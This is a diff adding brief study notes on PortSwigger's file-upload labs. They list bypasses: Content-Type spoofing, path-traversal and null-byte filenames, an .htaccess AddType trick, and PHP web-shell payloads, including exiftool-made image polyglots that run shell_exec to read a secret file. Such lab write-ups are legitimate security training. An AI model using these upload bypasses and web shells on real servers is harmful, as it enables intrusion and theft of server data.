@@ -1,0 +1,66 @@
+https://portswigger.net/web-security/file-upload
+
+Lab 1:
+
+==================================================
+Lab 2:
+Only jpeg and png are allowed
+
+Solution: change the content type header.
+Content-Type: image/jpeg instead of application/x-php
+
+==================================================
+Lab 3:
+The avatars directory is a contains user-supplied files. Which is why it is not allowed to execute files in there.
+To bypass, we can use path travelster to upload the shell to the files direcotry as it may not have the same restrictions.
+
+=> filename = "../shell.php"
+It will not work due to a filter.
+
+Bypass the filter via URL encoding
+=> filename = "%2e%2e%2fshell.php"
+
+==================================================
+Lab 4:
+Analyzing the requests => The server is running apache on ubuntu
+
+"""
+The .htaccess file is a configuration file used by Apache web servers to control various server settings and behaviors for a specific directory or website. The file's name stands for "hypertext access," and it allows users to make changes without needing to access the server’s main configuration files. This file is typically placed in the root directory of a website (or specific directories) and can control many aspects of the server's operation.
+
+Here are some common purposes of the .htaccess file:
+
+    URL Rewriting: You can use .htaccess to create "pretty" URLs, meaning URLs that are more readable and user-friendly. For example, converting a URL like example.com/page.php?id=1 to example.com/page/1.
+
+    Access Control: You can restrict or allow access to certain files, directories, or the entire website. For instance, limiting access to certain files based on IP address or password-protecting areas of the website.
+
+    Redirects: It is commonly used to redirect users from one page to another. For example, redirecting visitors from an old URL to a new one (useful when a page or website structure has changed).
+
+    Custom Error Pages: You can define custom error pages, like a custom 404 page for when users can't find a page.
+
+    Caching and Compression: It can be used to enable browser caching for static files or compress files for faster loading times.
+
+    Security Settings: You can secure your website by enabling SSL (HTTPS), blocking specific types of attacks, or disallowing file access for certain file types.
+
+    Customizing the Environment: You can modify the PHP settings or other server variables, like setting time zone or adjusting memory limits.
+"""
+=> NOTE: .htaccess files are not overwriting the overall server config. They are just an addition on a per-directory basis. So, in our case we are just adding an "AddType" config for the folder where we are allowed to upload files. 
+It's not universal, no!
+
+Exploiting: 
+upload .htaccess file => AddType application/x-httpd-php .spongebob
+upload shell.spongebob => <?php $output = shell_exec('cat /home/carlos/secret'); echo $output; ?>
+==================================================
+
+Lab 5:
+Add null byte before image extention => filename = "shell.php%00.png"
+
+==================================================
+Lab 6:
+Polygot files are files that can act as different types of files based on the program that opens them.
+We can embedd a php payload in a jpeg image. => polygot.php
+
+exiftool -Comment="<?php \$output = shell_exec('cat /home/carlos/secret'); echo 'HERE IS THE ANSWER =>', \$output, '<= THE ANSWER IS HERE'; ?>" batman.jpg -o polygot.php
+cat batman.jpg command_exec.php > another_polygot.php
+
+==================================================
+Lab 6:
